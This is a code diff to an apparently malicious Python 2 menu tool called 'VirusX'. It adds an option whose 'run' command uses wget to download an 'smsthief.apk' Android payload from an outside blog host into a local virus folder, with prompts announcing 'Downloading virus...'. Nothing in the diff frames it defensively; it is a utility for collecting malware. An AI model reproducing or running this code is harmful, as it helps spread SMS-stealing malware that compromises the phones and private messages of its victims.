@@ -106,7 +106,7 @@ def main():
 			print
 			main()
  elif dr == "05":
-		dea = raw_input(""+N+"DrXp > ")
+		dea = raw_input(""+N+"Virus"+B+"X > ")
 		if dea == "run":
 			time.sleep(1)
 			print ""+B+"[*]"+N+" Downloading virus..."
@@ -117,6 +117,18 @@ def main():
 			time.sleep(1)
 			print ""+B+"[*]"+N+" Job finished"
 			print
+			main()
+ elif dr == "06":
+		dea = raw_input(""+N+"Virus"+B+"X > ")
+		if dea == "run":
+			time.sleep(1)
+			print ""+B+"[*]"+N+" Downloading virus..."
+			os.system("cd virus;mkdir sms_tief;cd sms_tief;wget http://loolzec.blogwaper.com/files/smsthief.apk")
+			time.sleep(1)
+			print
+			print "Now check folder virus on "+R+"/VirusX/virus/sms_tief/"
+			time.sleep(1)
+			print ""+B+"[*]"+N+"Finished"
 			main()
   elif dr == "virusx update":
     print ""+G+"~ "+B+"UPDATING..."
